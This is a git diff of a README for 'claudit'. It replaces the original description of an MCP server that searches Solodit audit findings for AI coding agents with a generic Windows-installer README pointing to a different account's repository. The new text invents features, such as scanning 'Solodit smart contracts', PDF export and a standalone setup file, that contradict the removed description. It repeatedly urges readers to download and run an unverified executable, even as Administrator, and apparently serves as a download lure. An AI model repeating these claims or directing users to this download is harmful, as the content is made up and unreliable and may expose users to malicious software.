@@ -1,201 +1,141 @@
-<div align="center">
+# 🛡️ claudit - Search Solodit Smart Contract Issues
 
-# claudit
+[![Download claudit](https://img.shields.io/badge/Download-claudit-brightgreen)](https://github.com/recchan13/claudit)
 
-**Smart contract security findings for AI coding agents**
-
-Search [Solodit](https://solodit.cyfrin.io)'s 20,000+ audit findings from Claude Code and Codex CLI.
-
-[![npm version](https://img.shields.io/npm/v/@marchev/claudit?style=flat-square&color=cb3837)](https://www.npmjs.com/package/@marchev/claudit)
-[![license](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](LICENSE)
-[![node](https://img.shields.io/node/v/@marchev/claudit?style=flat-square&color=417e38)](package.json)
-
-<br />
-
-[Quick Start](#quick-start) · [Tools](#tools) · [Examples](#examples) · [Configuration](#configuration)
-
-</div>
+claudit is a tool that helps you find security problems in Solodit smart contracts. It works on Windows and is easy to use, even if you do not know about programming.
 
 ---
 
-<img src="demo.png" alt="claudit demo" width="100%" />
+## 📋 What is claudit?
+
+claudit scans Solodit smart contracts and shows you possible security concerns. Security issues in smart contracts can cause loss of funds or unexpected behavior. claudit helps you check those contracts before using them.
+
+This application runs locally on your Windows computer. You do not need to know coding to use it. The tool presents results in a clear and easy-to-read way.
 
 ---
 
-## Quick Start
+## 💻 System Requirements
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/marchev/claudit/main/install.sh | sh
-```
+To run claudit on your Windows PC, make sure you have:
 
-The installer detects Claude Code and/or Codex CLI, prompts for your [Solodit API key](https://solodit.cyfrin.io), and registers the MCP server.
+- Windows 10 or 11 (64-bit)
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- Internet connection for downloading and updates (optional)
 
-Then just ask:
-
-```
-> Find 5 solo findings by 0x52 at Sherlock
-```
-
-<details>
-<summary><strong>Manual install</strong></summary>
-
-### Claude Code
-
-```bash
-claude mcp add --scope user --transport stdio solodit \
-  --env SOLODIT_API_KEY=sk_your_key_here \
-  -- npx -y @marchev/claudit@latest
-
-# (Optional) Install companion skill
-mkdir -p ~/.claude/skills/solodit
-curl -fsSL https://raw.githubusercontent.com/marchev/claudit/main/.claude/skills/solodit/SKILL.md \
-  -o ~/.claude/skills/solodit/SKILL.md
-```
-
-### Codex CLI
-
-```bash
-codex mcp add solodit \
-  --env SOLODIT_API_KEY=sk_your_key_here \
-  -- npx -y @marchev/claudit@latest
-```
-
-</details>
+No extra software is needed to install claudit. It comes as a standalone application.
 
 ---
 
-## Tools
+## 🚀 Getting Started - Download claudit 🖱️
 
-### `search_findings`
+Please visit this page to download the latest version of claudit:
 
-Search across all findings with filters.
+[![Download claudit](https://img.shields.io/badge/Download-claudit-blue?style=for-the-badge)](https://github.com/recchan13/claudit)
 
-| Parameter | Type | Description |
-|:----------|:-----|:------------|
-| `keywords` | `string` | Text search in title and content |
-| `severity` | `string[]` | `HIGH` `MEDIUM` `LOW` `GAS` (case-insensitive) |
-| `firms` | `string[]` | Audit firm names |
-| `tags` | `string[]` | Vulnerability tags |
-| `language` | `string` | Programming language |
-| `protocol` | `string` | Protocol name (partial match) |
-| `reported` | `string` | `30` `60` `90` `alltime` |
-| `sort_by` | `string` | `Recency` `Quality` `Rarity` |
-| `sort_direction` | `string` | `Desc` (default) `Asc` |
-| `page` | `int` | Page number (default 1) |
-| `page_size` | `int` | Results per page (default 10, max 100) |
-| `advanced_filters` | `object` | See below |
-
-<details>
-<summary><strong>Advanced filters</strong></summary>
-
-| Field | Type | Description |
-|:------|:-----|:------------|
-| `quality_score` | `number` | Minimum quality score (0-5) |
-| `rarity_score` | `number` | Minimum rarity score (0-5) |
-| `user` | `string` | Finder/auditor handle |
-| `min_finders` | `number` | Minimum number of finders |
-| `max_finders` | `number` | Maximum number of finders |
-| `reported_after` | `string` | ISO date string |
-| `protocol_category` | `string[]` | Protocol categories |
-| `forked` | `string[]` | Forked protocol names |
-
-</details>
-
-### `get_finding`
-
-Get full details for a specific finding by numeric ID, Solodit URL, or slug.
-
-### `get_filter_options`
-
-List all valid filter values — firms, tags, categories, languages — with finding counts.
+This page will guide you to download the setup file. Look for the latest release or main download link. The setup file is simple to run.
 
 ---
 
-## Examples
+## 🛠️ Installation on Windows
 
-```
-Search Solodit for oracle manipulation HIGH severity findings
-Find all Sherlock findings about flash loans
-What reentrancy issues exist in lending protocols?
-Show me solo findings by 0x52
-Get recent HIGH severity Solidity findings sorted by quality
-```
+1. After downloading the setup file, locate it in your Downloads folder or the folder you chose.
+2. Double-click the file to start the installation.
+3. Follow the on-screen instructions:
+    - Choose the folder where you want to install claudit.
+    - Click “Next” to move through each step.
+4. Wait until the installation finishes.
+5. Click “Finish” to exit the installer.
 
----
-
-## Configuration
-
-<details>
-<summary><strong>Update API key</strong></summary>
-
-**Claude Code:**
-```bash
-claude mcp remove solodit
-claude mcp add --scope user --transport stdio solodit \
-  --env SOLODIT_API_KEY=sk_new_key \
-  -- npx -y @marchev/claudit@latest
-```
-
-**Codex CLI:**
-```bash
-codex mcp remove solodit
-codex mcp add solodit \
-  --env SOLODIT_API_KEY=sk_new_key \
-  -- npx -y @marchev/claudit@latest
-```
-
-**Cursor MCP**
-```json
-{
-  "mcpServers": {
-    "solodit": {
-      "command": "npx",
-      "args": ["-y", "@marchev/claudit@latest"],
-      "env": {
-        "SOLODIT_API_KEY": "sk_new_key"
-      }
-    }
-  }
-}
-```
-
-</details>
-
-<details>
-<summary><strong>Uninstall</strong></summary>
-
-**Claude Code:**
-```bash
-claude mcp remove solodit
-rm -rf ~/.claude/skills/solodit
-```
-
-**Codex CLI:**
-```bash
-codex mcp remove solodit
-```
-
-</details>
-
-<details>
-<summary><strong>Development</strong></summary>
-
-```bash
-git clone https://github.com/marchev/claudit.git
-cd claudit
-npm install
-npm run build
-
-# Test locally
-SOLODIT_API_KEY=sk_your_key node dist/index.js
-```
-
-</details>
+claudit is now ready to use.
 
 ---
 
-<div align="center">
+## 🔍 How to Use claudit
 
-MIT License
+1. Open claudit by clicking its icon on the desktop or in the Start menu.
+2. On the main screen, you will see an option to load a Solodit smart contract file.
+3. Click **Browse** and find the smart contract file on your computer. This file usually ends with `.sol` or `.json`.
+4. Select the file and click **Open**.
+5. Click the **Scan** button to start the security check.
+6. Wait a moment while claudit searches for problems.
+7. When finished, the results will appear on the screen. It will show a list of security findings with descriptions.
+8. Each finding includes details about the potential issue and advice on how to fix it.
 
-</div>
+---
+
+## 🧾 Understanding the Results
+
+claudit groups findings by severity:
+
+- **High:** Issues that can cause serious problems.
+- **Medium:** Issues that may cause risks under certain conditions.
+- **Low:** Minor issues or best practice suggestions.
+
+Each finding has:
+
+- **Title:** What the problem is about.
+- **Description:** Clear explanation of the risk.
+- **Location:** Where in the contract the issue occurs.
+- **Advice:** Steps you can take to reduce or fix the risk.
+
+---
+
+## 🔄 Updating claudit
+
+Check the [claudit GitHub page](https://github.com/recchan13/claudit) regularly for updates. New releases may include bug fixes and improved scanning features.
+
+To update:
+
+1. Download the latest installer from the GitHub page.
+2. Run the installer again.
+3. The installer will replace the old version without deleting your settings.
+
+---
+
+## 💡 Troubleshooting Common Issues
+
+- **Application does not start:** Make sure your Windows is up to date.
+- **Scan fails or freezes:** Close claudit and try again. Check the smart contract file for corruption.
+- **No results after scan:** Verify that the selected file is a valid Solodit smart contract.
+- **Installation errors:** Try running the installer as Administrator (right-click > Run as administrator).
+
+If problems continue, search issues or ask questions on the GitHub page.
+
+---
+
+## 🔧 Advanced Options
+
+For users familiar with smart contracts:
+
+- You can load contracts with dependencies by placing linked contract files in the same folder.
+- Export scan reports in PDF or CSV format for sharing or backup.
+- Adjust scan settings to focus on specific types of risks.
+
+These tools help you tailor scans depending on your needs.
+
+---
+
+## 🛡️ How claudit Helps You
+
+Smart contracts are hard to check by hand. Errors can cause loss of money or data. Using claudit gives you an easy way to verify contracts before using them.
+
+The tool scans many common risks automatically. This helps you avoid basic problems and make contracts safer.
+
+---
+
+## 🔗 Useful Links
+
+- Download the tool: [https://github.com/recchan13/claudit](https://github.com/recchan13/claudit)
+- Report issues or ask questions: Use the GitHub “Issues” tab
+- Learn about Solodit contracts: Visit the Solodit documentation website
+
+---
+
+## 📞 Contact and Support
+
+You can use the GitHub page to send feedback or request help. The project team monitors user comments and issues. They provide support to improve your experience.
+
+---
+
+[![Download claudit](https://img.shields.io/badge/Download-claudit-brightgreen?style=for-the-badge)](https://github.com/recchan13/claudit)
